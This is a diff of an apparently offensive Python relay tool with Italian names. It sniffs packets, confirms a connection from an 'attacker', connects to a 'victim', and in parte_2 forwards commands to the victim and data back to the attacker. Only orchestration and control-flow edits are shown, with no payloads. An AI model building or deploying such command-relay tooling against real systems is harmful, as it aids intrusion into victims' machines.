@@ -186,11 +186,10 @@ def conn_from_attaccante():
     com.sniff_packet(args, None)
     com.wait_pkt_conn_received() 
     if com.sniffer.running:
-        com.sniffer.stop()
-        is_vittima_connected=True
-        com.sniffer.join()
+        com.sniffer.stop() 
     if com.timeout_timer.is_alive():
         com.timeout_timer.cancel()
+        is_attaccante_connected=True
         data=com.CONFIRM_ATTACKER.encode() 
         if com.send_packet(data,ip_attaccante):
             print(f"Connessione stabilita per {ip_attaccante}")
@@ -233,6 +232,43 @@ def get_args_from_parser():
 
 def def_global_variables():
     pass
+
+#-------------------
+def parte_1():
+    #1) 
+    try:
+        def_global_variables()
+        args=get_args_from_parser() 
+        if not check_value_in_parser(args):
+            exit(0)
+        get_value_of_parser(args) 
+    except Exception as e: 
+        print(f"Eccezione args: {e}")
+        exit(1)
+    #2) 
+    try:
+        print("\tconn_from_attaccante")
+        conn_from_attaccante()
+    except Exception as e:
+        print(f"Eccezione wait_conn_from_attaccante: {e}")
+        exit(1) 
+    #3) 
+    try: 
+        print("\tconn_to_vittima")
+        if conn_to_vittima():
+            #4) 
+            try:
+                while not aggiorna_attaccante():
+                    print("\taggiorna_attaccante")
+                    print(print(datetime.datetime.now()))
+                    time.sleep(1)
+            except Exception as e:
+                print(f"aggiorna_attaccante: {e}")
+        else:
+            exit(0) 
+    except Exception as e:
+        print(f"connessione_vittima: {e}")
+        exit(1) 
 
 #-- Main --# 
 def callback_is_attacker_ready(packet):
@@ -353,44 +389,11 @@ def parte_2():
         send_command_to_victim(command_to_redirect) 
         send_data_to_attacker(packet_received)
 
-def parte_1():
-    #1) 
-    try:
-        def_global_variables()
-        args=get_args_from_parser() 
-        if not check_value_in_parser(args):
-            exit(0)
-        get_value_of_parser(args) 
-    except Exception as e: 
-        print(f"Eccezione args: {e}")
-        exit(1)
-    #2) 
-    try:
-        print("\tconn_from_attaccante")
-        conn_from_attaccante()
-    except Exception as e:
-        print(f"Eccezione wait_conn_from_attaccante: {e}")
-        exit(1) 
-    #3) 
-    try: 
-        print("\tconn_to_vittima")
-        if conn_to_vittima():
-            #4) 
-            try:
-                while not aggiorna_attaccante():
-                    print("\taggiorna_attaccante")
-                    print(print(datetime.datetime.now()))
-                    time.sleep(1)
-            except Exception as e:
-                print(f"aggiorna_attaccante: {e}")
-        else:
-            exit(0) 
-    except Exception as e:
-        print(f"connessione_vittima: {e}")
-        exit(1) 
+
 
 if __name__ == "__main__": 
-    #parte_1()
+    parte_1()
+    exit(0)
     parte_2()
     exit(0)
     try:
